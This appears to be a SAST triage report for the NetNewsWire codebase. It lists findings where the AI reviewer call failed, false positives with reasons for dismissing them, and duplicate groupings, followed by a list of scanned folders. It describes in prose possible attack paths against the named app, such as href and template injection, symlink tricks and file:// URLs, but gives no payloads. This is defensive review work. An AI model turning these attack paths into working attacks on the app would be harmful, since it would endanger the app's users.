- **[VERIFY-ERR]** `Mac/ActivityLog/ActivityLogWindowController.swift:140` logic-flaw (spec-batch-etl-25) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Mac/AppDefaults.swift:67` logic-flaw (spec-logic-bug-26) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Mac/Dinosaurs/DinosaursWindowController.swift:109` race-condition (spec-logic-bug-30) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Mac/MainWindow/Detail/main_mac.js:8` logic-flaw (spec-logic-bug-35) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Mac/Preferences/Accounts/AccountCell.swift:17` logic-flaw (spec-logic-bug-39) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Mac/Preferences/Advanced/AdvancedPreferencesViewController.swift:33` logic-flaw (spec-logic-bug-39) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Mac/Scripting/AppDelegate+Scriptability.swift:49` logic-flaw (spec-logic-bug-42) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Mac/Scripting/Account+Scriptability.swift:143` logic-flaw (spec-logic-bug-42) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/Account/Sources/Account/Feedbin/FeedbinAccountDelegate.swift:696` logic-flaw (spec-logic-bug-45) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/Account/Sources/Account/NewsBlur/Internals/NewsBlurAccountDelegate+Internal.swift:115` logic-flaw (spec-logic-bug-45) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/ActivityLog/Sources/ActivityLog/ActivityLog.swift:273` logic-flaw (spec-logic-bug-46) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/Articles/Sources/Articles/Article.swift:62` logic-flaw (spec-logic-bug-47) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/Articles/Sources/Articles/ArticleStatus.swift:80` logic-flaw (spec-logic-bug-47) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/ArticlesDatabase/Sources/ArticlesDatabase/AuthorsSchemaMigration.swift:30` logic-flaw (spec-logic-bug-48) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/ArticlesDatabase/Sources/ArticlesDatabase/AuthorsSchemaMigration.swift:98` race-condition (spec-logic-bug-48) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/CloudKitSync/Sources/CloudKitSync/CloudKitZoneResult.swift:47` logic-flaw (spec-logic-bug-49) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/FeedFinder/Sources/FeedFinder/FeedFinder.swift:63` logic-flaw (spec-logic-bug-51) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/FeedFinder/Sources/FeedFinder/HTMLFeedFinder.swift:58` logic-flaw (spec-logic-bug-51) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/HTMLMetadata/Sources/HTMLMetadata/HTMLMetadataDownloader.swift:136` logic-flaw (spec-logic-bug-52) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/Images/Sources/Images/FaviconDownloader.swift:158` logic-flaw (spec-logic-bug-53) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/NewsBlur/Sources/NewsBlur/Models/NewsBlurStory.swift:29` logic-flaw (spec-logic-bug-54) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/RSDatabase/Sources/RSDatabase/FMDatabase+Extras.swift:27` logic-flaw (spec-logic-bug-57) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/RSDatabase/Sources/RSDatabase/DatabaseQueue.swift:119` logic-flaw (spec-logic-bug-57) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/RSParser/Sources/RSParser/Feeds/Data+ProbablyFormat.swift:39` logic-flaw (spec-logic-bug-58) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/RSTree/Sources/RSTree/TreeController.swift:43` logic-flaw (spec-logic-bug-59) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/RSWeb/Sources/RSWeb/URL+RSWeb.swift:72` logic-flaw (spec-logic-bug-60) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/SyncDatabase/Sources/SyncDatabase/SyncStatus.swift:46` logic-flaw (spec-logic-bug-62) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Shared/Activity/ActivityManager.swift:154` logic-flaw (spec-logic-bug-66) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Shared/ArticleStyles/ArticleThemesManager.swift:154` logic-flaw (spec-logic-bug-73) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Shared/Commands/DeleteCommand.swift:65` logic-flaw (spec-logic-bug-75) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Shared/Commands/DeleteCommand.swift:149` logic-flaw (spec-batch-etl-75) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Shared/Dinosaurs/DinosaursViewModel.swift:69` logic-flaw (spec-logic-bug-77) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Shared/Extensions/ArticleStringFormatter.swift:168` logic-flaw (spec-logic-bug-80) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Shared/SmartFeeds/SearchFeedDelegate.swift:18` logic-flaw (spec-logic-bug-85) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Shared/SmartFeeds/SmartFeed.swift:111` race-condition (spec-logic-bug-85) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Shared/Timeline/ArticleArray.swift:27` logic-flaw (spec-logic-bug-86) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Shared/Timeline/FetchRequestOperation.swift:79` logic-flaw (spec-logic-bug-86) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Shared/Timer/ArticleStatusSyncTimer.swift:80` logic-flaw (spec-logic-bug-87) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Shared/Tree/SidebarTreeControllerDelegate.swift:84` logic-flaw (spec-logic-bug-88) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Shared/UserNotifications/UserNotificationManager.swift:40` logic-flaw (spec-logic-bug-90) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Shared/Widget/WidgetDataEncoder.swift:220` logic-flaw (spec-logic-bug-91) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Shared/Widget/WidgetDataEncoder.swift:63` logic-flaw (spec-logic-bug-91) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Themes/NewsFax.nnwtheme/template.html:40` injection (spec-batch-etl-95) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Mac/MainWindow/Detail/main_mac.js:8` injection (spec-access-control-35) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Mac/SafariExtension/SafariExtensionHandler.swift:32` race-condition (spec-access-control-41) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Mac/ShareExtension/ShareViewController.swift:61` injection (spec-access-control-43) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[FP]** `Modules/Images/Sources/Images/FaviconDownloader.swift:33` race-condition (spec-access-control-53) — The race condition is real and correctly described, but the sole impact is cosmetic favicon-display corruption (no favicon shown for a legitimate site); there is no path to data exposure, authentication bypass, or code execution, placing this firmly in the noise-floor exclusion.
- **[FP]** `Shared/Commands/DeleteCommand.swift:156` race-condition (spec-access-control-75) — @MainActor isolation on both Account and SidebarItemSpecifier prevents concurrent deallocation; delete() executes synchronously on the serial main actor with no suspension point between start() and the optional chain, making the described nil-account race impossible in practice
- **[FP]** `Shared/ArticleStyles/ArticleTheme.swift:83` info-leak (spec-access-control-73) — macOS production builds enforce App Sandbox at VFS level; symlink targets outside the process's authorised paths return EPERM. iOS is equally sandboxed by the OS. The code pattern is real but neutralised by the platform sandbox in all production-reachable deployments.
- **[FP]** `Shared/UserNotifications/UserNotificationManager.swift:82` logic-flaw (spec-access-control-90) — The scanner incorrectly claims `articleID` is the raw feed `<guid>` with no namespacing; in reality, local/CloudKit accounts hash `feedURL+guid` via MD5 (making cross-feed collision computationally infeasible), and all sync accounts use server-assigned IDs unrelated to the feed's `<guid>`.
- **[FP]** `Themes/Sepia.nnwtheme/Info.plist:10` other (spec-access-control-97) — The HTTP URL is hardcoded by the developer for their own public website, requires explicit user opt-in to open, carries no sensitive data, and is subject to HSTS; no realistic path to data exposure or auth bypass exists.
- **[FP]** `buildscripts/ci-build.sh:12` info-leak (spec-batch-etl-108) — `ci-build.sh` is never invoked by any CI workflow or other script in the repository; it is dead legacy code, so `$ENCRYPTION_SECRET` is never placed on any process argv in practice.
- **[FP]** `buildscripts/ci-build.sh:19` logic-flaw (spec-access-control-108) — `ci-build.sh` is never invoked by any workflow; the vulnerable keychain setup path is dead code with no external caller
- **[FP]** `iOS/ErrorHandler.swift:29` info-leak (spec-access-control-123) — ReaderAPI credentials travel in HTTP headers and POST bodies, never URL query parameters; `NSURLError.localizedDescription` omits the failing URL; and Apple Unified Logging's default `.private` annotation for dynamic strings prevents leakage in production builds
- **[FP]** `iOS/MainTimeline/MarkAsReadAlertController.swift:26` logic-flaw (spec-access-control-130) — the guard does bypass the confirmation dialog, but all mutation paths in every completion closure gate on `coordinator?` via optional chaining, making them no-ops in the same nil-coordinator scenario; no article read-state is committed without user intent
- **[FP]** `scripts/check_localization_comments.py:99` injection (spec-batch-etl-139) — The script is never invoked in the CI pipeline; zero references to it exist anywhere in the codebase, so the required precondition (CI runner executing the script and parsing its stdout) cannot be met.
- **[FP]** `Modules/NewsBlur/Sources/NewsBlur/NewsBlurAPICaller.swift:112` injection (spec-batch-etl-06) — `NewsBlurFeed.feedID` is `Int`; Swift's JSON decoder rejects non-integer values at parse time, making any path-traversal feedID string impossible to reach the URL construction code.
- **[FP]** `Modules/ArticlesDatabase/Sources/ArticlesDatabase/ArticlesTable.swift:938` logic-flaw (spec-batch-etl-04) — `articleID` is `MD5(subscriptionURL + " " + guid)`; the subscription URL is app-controlled and never read from feed content, so a cross-feed collision via attacker-crafted `<guid>` is computationally infeasible
- **[FP]** `Shared/ArticleStyles/ArticleThemeDownloader.swift:73` logic-flaw (spec-batch-etl-11) — marmelroy/Zip writes every zip entry (including symlink entries) via `fopen(path, "wb")` as a regular file; no `symlink()` call exists in the library, so no real symlink is ever created and the described attack chain cannot execute
- **[FP]** `Mac/AppDelegate.swift:343` logic-flaw (spec-batch-etl-12) — the scanner mis-modelled the sink: `.nnwtheme` is a directory bundle, not a flat file, so a symlink to `~/.ssh/id_rsa` yields an immediate path-not-found on `<id_rsa>/Info.plist`; `url.path` in the error notification is the symlink's own path (not target), so `openThemesFolder` merely opens the download parent folder; and the successful-parse installation path requires explicit user confirmation.
- **[FP]** `Mac/MainWindow/NNW3/NNW3ImportController.swift:98` race-condition (spec-batch-etl-16) — Production build has `com.apple.security.app-sandbox=true`, making `temporaryDirectory` container-scoped; a generic same-user process cannot reach that path, structurally closing the TOCTOU window the scanner describes.
- **[FP]** `Mac/ActivityLog/ActivityLogWindowController.swift:98` injection (spec-batch-etl-25) — formula injection is a vulnerability in the spreadsheet application that evaluates pasted clipboard text as formulas, not in NetNewsWire which legitimately displays and copies feed-sourced plain text; enforcement belongs to the destination application, and the multi-step user action chain is speculative noise-floor.
- **[FP]** `Mac/ErrorLog/ErrorLogWindowController.swift:89` injection (spec-batch-etl-32) — The scanner's foundational claim is wrong: HTTP response bodies are never included in errorMessage; all error strings derive from integer status codes and hardcoded Apple SDK lookups. Even if they were, clipboard-to-spreadsheet formula injection is out of scope as a noise-floor finding requiring full user intent and a downstream app's auto-execution behavior.
- **[FP]** `Mac/MainWindow/Timeline/ArticlePasteboardWriter.swift:79` injection (spec-batch-etl-35) — Formula injection executes in the destination spreadsheet application, not in NetNewsWire; NetNewsWire correctly writes plain text to the clipboard and bears no responsibility for how third-party applications interpret that text. The enforcement boundary is the spreadsheet consumer, not the clipboard producer.
- **[FP]** `Mac/Scripting/Feed+Scriptability.swift:61` other (spec-batch-etl-42) — `Downloader` enforces http/https-only scheme, sends no cookies or credentials (ephemeral session with cookie storage nil), and returns no response body to the AppleScript caller; the attacker must already have same-user code execution, granting direct network access superior to what NetNewsWire provides.
- **[FP]** `Modules/RSCore/Sources/RSCoreResources/AppKit/WebViewWindowController.swift:27` info-leak (spec-batch-etl-56) — The only caller of `displayContents(of:)` passes a hardcoded `Bundle.path(forResource:ofType:)` value; `application(_:openFile:)` does not call it and the claimed attacker-controlled data flow does not exist in the code.
- **[FP]** `Modules/ActivityLog/Sources/ActivityLog/ActivityLog.swift:25` other (spec-batch-etl-46) — Both scanner-cited entry points do not handle OPML: `application(_:openFile:)` gates on `.nnwtheme` suffix only; the Intents handler adds single feeds. Bulk import requires deliberate menu navigation plus explicit file selection in a system open-panel dialog; no external attacker-controlled entry point exists.
- **[FP]** `Modules/RSDatabase/Sources/RSDatabaseObjC/FMDatabase.m:554` other (spec-batch-etl-57) — The `hasDateFormatter` precondition is never true anywhere in the codebase; `setDateFormat:` is never called on any `FMDatabase` instance, so the vulnerable `SQLITE_STATIC` branch is dead code.
- **[FP]** `Modules/ArticlesDatabase/Sources/ArticlesDatabase/AuthorsSchemaMigration.swift:98` logic-flaw (spec-batch-etl-48) — The failable `Author.init` that would cause the migration to loop was also the write-path guard in the old `authorsWithParsedAuthors` code; a remote feed cannot create legacy `authors` rows where all display fields are SQL NULL because such an `Author` object could never be constructed and stored. The scanner's "empty strings" variant of the exploit would not trigger the nil check at all.
- **[FP]** `Shared/ArticleStyles/ArticleThemesManager.swift:107` race-condition (spec-batch-etl-73) — App Sandbox prevents any other process from writing into the themes folder on all distribution builds; non-sandboxed builds require same-user code execution as a precondition, which is already out of scope per policy
- **[FP]** `Shared/ShareExtension/ExtensionFeedAddRequestFile.swift:162` logic-flaw (spec-batch-etl-84) — `Downloader.isHTTPOrHTTPSURL()` guard at line 70 of Downloader.swift unconditionally blocks all non-HTTP/HTTPS schemes before any I/O, causing `FeedFinder` to throw `feedNotFound`; no file read occurs.
- **[FP]** `iOS/AppDefaults.swift:111` logic-flaw (spec-batch-etl-119) — The Intents handler never writes or reads `addFeedAccountID`; it uses the correct app-group file IPC for the actual subscription. The `UserDefaults.standard` inconsistency is a UX preference bug, not an exploitable cross-process data-routing vulnerability.
- **[FP]** `iOS/AppDefaults.swift:514` logic-flaw (spec-batch-etl-119) — `session.stateRestorationActivity` is the app's own device-local saved state; Handoff activities from peer devices enter via a completely separate code path (`connectionOptions.userActivities` → `coordinator.handle`) and never reach `init(legacyState:)`, so no external entry point reaches the premature flag write.
- **[FP]** `iOS/ArticleActivityItemSource.swift:29` injection (spec-batch-etl-121) — The share-sheet subject string is metadata for UI destinations (e.g. email subjects), not a CSV cell or formula-evaluated field; no iOS share extension treats a `UIActivityItemSource` subject as a spreadsheet formula input, so there is no exploitable path to formula injection
- **[FP]** `iOS/MainTimeline/Cell/MainTimelineCell.swift:232` injection (spec-batch-etl-130) — The data flow is real and the code matches the scanner's description, but the impact is confined to accessibility label text confusion with no path to data exposure, auth bypass, or code execution; attacker social-engineering capability through this vector is not meaningfully greater than their baseline ability to display arbitrary content to feed subscribers.
- **[FP]** `iOS/TitleActivityItemSource.swift:29` injection (spec-batch-etl-137) — NetNewsWire passes article titles to system share extensions as plain strings, which is its intended function; it does not generate CSV output. The formula-injection sink (CSV export) belongs entirely to OmniFocus/Things, not to NetNewsWire. Stripping formula prefixes at this layer would corrupt legitimate titles without fixing the actual gap.
- **[FP]** `Shared/Extensions/ArticleUtilities.swift:102` injection (spec-batch-etl-80) — Path traversal is blocked; the collision attack is real but requires the attacker to control the victim's sync server (already a fully trusted position with far greater impact levers) and yields only notification thumbnail visual corruption — no data exposure, auth bypass, or code execution within scope.
- **[FP]** `scripts/symbolicate_all_crashes.sh:114` race-condition (spec-batch-etl-140) — developer-only local tooling script with no production/CI invocation path; the claimed precondition (write access to CRASH_DIR) is equivalent to owning the target, and no privilege boundary is crossed
- **[FP]** `iOS/ShareExtension/ShareViewController.swift:80` injection (spec-batch-etl-136) — The `Downloader.isHTTPOrHTTPSURL()` guard at `RSWeb/Downloader.swift:70` rejects all non-HTTP/HTTPS URLs before any fetch occurs; a `file://` URL written to the IPC file produces a nil response that propagates as "feed not found" — no data exposure is possible.
- **[FP]** `scripts/symbolicate_crash.sh:106` logic-flaw (spec-batch-etl-141) — Developer-only tooling script; attacker would need to supply a crafted crash log to a developer who manually runs it; even then the only consequence is incorrect symbolication output with no security impact (no data exposure, no code execution, no auth bypass)
- **[DUP of #35]** `Mac/MainWindow/Sidebar/SidebarViewController.swift:298` injection (catchall-38) — SidebarViewController.openInBrowser calls the same Browser.open() with an unvalidated homePageURL; one fix in Browser.open() closes both.
- **[DUP of #16]** `Shared/Article Rendering/template.html:36` injection (catchall-79) — Shared/Article Rendering/template.html href injection traces to the same ArticleRenderer.articleSubstitutions() substitution path as index 26.
- **[DUP of #16]** `Themes/Biblioteca.nnwtheme/template.html:8` injection (catchall-105) — Biblioteca.nnwtheme href injection with [[preferred_link]] traces to the same ArticleRenderer substitution path fixed by index 26.
- **[DUP of #10]** `Themes/Hyperlegible.nnwtheme/template.html:36` injection (catchall-106) — Template inserting [[byline]] unescaped is the same cause-effect chain as ArticleRenderer.byline() building unescaped HTML; fixing byline() closes both.
- **[DUP of #22]** `Themes/Appanoose.nnwtheme/template.html:1` injection (spec-crypto-92) — Same file (Themes/Appanoose.nnwtheme/template.html), same line (1), same JavaScript string-literal injection described from a second angle.
- **[DUP of #16]** `Themes/Appanoose.nnwtheme/template.html:31` injection (spec-logic-bug-92) — Same file (Themes/Appanoose.nnwtheme/template.html) and same line (31) as index 26, describing the href scheme-injection issue from a second angle.
- **[DUP of #13]** `Themes/Promenade.nnwtheme/template.html:45` injection (catchall-108) — Promenade template [[body]] injection is the same root-cause vulnerability as index 36; a single sanitization fix closes both.
- **[DUP of #16]** `Themes/Tiqoe Dark.nnwtheme/template.html:4` injection (spec-crypto-98) — Tiqoe Dark template href injection with [[feed_link]]/[[preferred_link]]/[[external_link]] traces to the same ArticleRenderer substitution path fixed by index 26.
- **[DUP of #16]** `Themes/Verdana Revival.nnwtheme/template.html:6` injection (catchall-111) — Verdana Revival template href injection traces to the same ArticleRenderer.articleSubstitutions() fix as index 26.
- **[DUP of #24]** `Mac/Resources/Info.plist:55` other (spec-crypto-40) — Index 2 explicitly states it covers both iOS and macOS Info.plist NSAllowsArbitraryLoads settings; Mac/Resources/Info.plist is the same global ATS disable.
- **[DUP of #9]** `Mac/Scripting/AppDelegate+Scriptability.swift:56` other (spec-crypto-42) — Same file (Mac/Scripting/AppDelegate+Scriptability.swift) and same line (56) as index 14, describing the same macOS theme URL handler from a second angle.
- **[DUP of #16]** `Shared/Article Rendering/ArticleRenderer.swift:209` injection (spec-crypto-71) — ArticleRenderer.articleSubstitutions() is the exact shared helper that populates [[preferred_link]], [[feed_link]], and [[external_link]] in all templates; fixing it here closes index 26 and all other template href findings.
- **[DUP of #40]** `Modules/Account/Sources/Account/ReaderAPI/ReaderAPICaller.swift:494` logic-flaw (spec-logic-bug-01) — Same file and line (ReaderAPICaller.swift:494) as index 8, describing the same unbounded server-driven recursion from a memory-growth angle.
- **[DUP of #13]** `Themes/Sepia.nnwtheme/template.html:14` injection (spec-access-control-97) — Sepia template [[body]] insertion is the same raw-HTML-body vulnerability as index 36; one ArticleRenderer/CSP fix closes both.
- **[DUP of #13]** `Themes/Biblioteca.nnwtheme/template.html:14` injection (spec-access-control-93) — Biblioteca template [[body]] insertion is the same raw-HTML-body vulnerability as index 36; one fix closes both.
- **[DUP of #34]** `iOS/Article/ArticleIconSchemeHandler.swift:20` other (spec-access-control-120) — Same file (ArticleIconSchemeHandler.swift), lines within 10 of each other, and both describe the same unauthenticated article-ID lookup oracle from two angles.
- **[DUP of #56]** `iOS/ShareExtension/ShareViewController.swift:80` other (spec-access-control-136) — Same file (iOS/ShareExtension/ShareViewController.swift) and same force-cast of results[\
- **[DUP of #28]** `Modules/RSParser/Sources/RSParser/Feeds/XML/RSSParser.swift:238` injection (spec-batch-etl-02) — Same file (RSSParser.swift) and same line (238) as index 54, describing the same unvalidated URL scheme storage from a comparative Atom-vs-RSS angle.
- **[DUP of #41]** `iOS/Article/WebViewController.swift:689` other (spec-batch-etl-13) — Same file (iOS/Article/WebViewController.swift) and same line (689) as index 1, describing the same imageWasClicked scheme-validation gap.
- **[DUP of #8]** `iOS/SceneDelegate.swift:195` other (spec-batch-etl-13) — Same file (iOS/SceneDelegate.swift) and same line (195) as index 0, describing the same theme deep-link arbitrary download from a second angle.
- **[DUP of #35]** `Mac/MainWindow/MainWindowController.swift:1003` other (spec-batch-etl-15) — MainWindowController.currentLink passed to Browser.open() without scheme validation is the same caller-side gap fixed by validating in Browser.open() (index 10).


---

## Appendix: Scan Scope

### Folders scanned (223)

- `./`
- `.github/`
- `.github/workflows/`
- `Intents/`
- `Intents/Base.lproj/`
- `Intents/en.lproj/`
- `Mac/`
- `Mac/About/`
- `Mac/AccountStats/`
- `Mac/AccountStats/Base.lproj/`
- `Mac/AccountStats/mul.lproj/`
- `Mac/ActivityLog/`
- `Mac/ActivityLog/Base.lproj/`
- `Mac/ActivityLog/mul.lproj/`
- `Mac/Base.lproj/`
- `Mac/CloudKitStats/`
- `Mac/CloudKitStats/CleanUp/`
- `Mac/CloudKitStats/Scan/`
- `Mac/CrashReporter/`
- `Mac/CurrentActivity/`
- `Mac/CurrentActivity/Base.lproj/`
- `Mac/CurrentActivity/mul.lproj/`
- `Mac/Dinosaurs/`
- `Mac/Dinosaurs/Base.lproj/`
- `Mac/Dinosaurs/mul.lproj/`
- `Mac/ErrorLog/`
- `Mac/ErrorLog/Base.lproj/`
- `Mac/ErrorLog/mul.lproj/`
- `Mac/Inspector/`
- `Mac/MainWindow/`
- `Mac/MainWindow/AddFeed/`
- `Mac/MainWindow/AddFolder/`
- `Mac/MainWindow/Detail/`
- `Mac/MainWindow/Detail/Keyboard/`
- `Mac/MainWindow/Keyboard/`
- `Mac/MainWindow/NNW3/`
- `Mac/MainWindow/OPML/`
- `Mac/MainWindow/Sidebar/`
- `Mac/MainWindow/Sidebar/Cell/`
- `Mac/MainWindow/Sidebar/Keyboard/`
